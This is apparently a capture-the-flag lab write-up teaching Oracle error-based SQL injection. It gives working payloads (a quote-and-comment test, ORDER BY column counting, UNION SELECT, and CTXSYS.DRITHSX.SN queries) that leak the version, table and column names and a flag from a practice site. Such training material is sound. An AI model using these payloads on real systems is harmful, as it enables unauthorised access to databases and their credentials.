# Lab 6 ORACLE Error-Based Injection

## 0x00 Basic Knowledge

In general, error-based injections are pretty much same. So, similar as [MySQL](../lab3_mysql_error_based_injection) and [MSSQL](../lab5_mssql_error_based_injection) error-based injection, we can find table names and corresponding field names for union select query.

However, as there are some different syntax, and system table seetings between these databases. 

### [DUAL][3]

DUAL is a table automatically created by Oracle Database along with the data dictionary. DUAL is in the schema of the user SYS but is accessible by the name DUAL to all users. It has one column, DUMMY, defined to be VARCHAR2(1), and contains one row with a value X. Selecting from the DUAL table is useful for computing a constant expression with the SELECT statement. Because DUAL has only one row, the constant is returned only once. Alternatively, you can select a constant, pseudocolumn, or expression from any table, but the value will be returned as many times as there are rows in the table. Please refer to "SQL Functions" for many examples of selecting a constant value from DUAL.

#### Default

```sql
SELECT * FROM DUAL
```

| DUMMY |
| ----- |
| X     |

#### Get Current User

```sql
SELECT USER FROM DUAL
```

#### Random

```sql
SELECT DBMS_RANDOM.RANDOM FROM DUAL
```

#### Basic Calculation

```sql
SELECT 1+1 FROM DUAL
```

### Useful Queries

```sql
SELECT * FROM ALL_TABLES
SELECT * FROM USER_TABLES

SELECT * FROM ALL_TAB_COLUMNS
SELECT * FROM USER_TAB_COLUMNS
```

### ROWNUM

Performs as LIMIT, but except ROWNUM=1, the rest need to be ROWNUM<3, ROWNUM<4 etc.

### Injection Query

```sql
WHERE/AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM sys.v_$version WHERE ROWNUM=1))--  
```

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Injection Point

Try close query and comment out the rest. Get data here.

```sql
?id=1' --
```

![](./imgs/1_ip.jpg)

### Determine Table Fields Number

Tried **ORDER BY 1,2,3** all works but 4 does not. So should have 3 fields.

```sql
?id=1' ORDER BY 1,2,3 --
```

![](./imgs/2_order.jpg)

```sql
?id=1' ORDER BY 4 --
```

![](./imgs/2_order_err.jpg)

### UNION ALL SELECT

Tried UNION ALL SELECT, but except the number value, nothing can show in the rest of fields.

```sql
?id=1' UNION ALL SELECT NULL,NULL,NULL FROM DUAL --
```

![](./imgs/3_union.jpg)

```sql
?id=1' UNION ALL SELECT 2,NULL,NULL FROM DUAL --
```

![](./imgs/3_union_show.jpg)

### Show Version in Error

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM sys.v_$version WHERE ROWNUM=1)) --
```

![](./imgs/4_ver.jpg)

DB version = Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit

### Get Table Name

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1)) --
```

![](./imgs/5_tbl_name.jpg)

TABLE_NAME = ADMIN

### Get Field Name

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='ADMIN' AND ROWNUM=1)) --
```

![](./imgs/6_id.jpg)

Not what we want, filter for next one.

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='ADMIN' AND ROWNUM=1 AND COLUMN_NAME<>'ID')) --
```

![](./imgs/7_un.jpg)

Still not, keep filtering.

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='ADMIN' AND ROWNUM=1 AND COLUMN_NAME<>'ID' AND COLUMN_NAME<>'USER_NAME')) --
```

![](./imgs/8_pw.jpg)

Still not, keep filtering.

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='ADMIN' AND ROWNUM=1 AND COLUMN_NAME<>'ID' AND COLUMN_NAME<>'USER_NAME' AND COLUMN_NAME<>'PASSWORD')) --
```

Finally, get the field.

![](./imgs/9_field.jpg)

| COLUMN_NAME |
| ----------- |
| ID          |
| USER_NAME   |
| PASSWORD    |
| FLAG_FLAG   |

### Dump the FLAG

```sql
?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT FLAG_FLAG FROM ADMIN WHERE ROWNUM=1)) --
```

![](./imgs/10_flag.jpg)

**FLAG** = **zkaq{a93fe484c}**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=da05d8b66dcda694
[2]: http://o1.lab.aqlab.cn:81/
[3]: https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm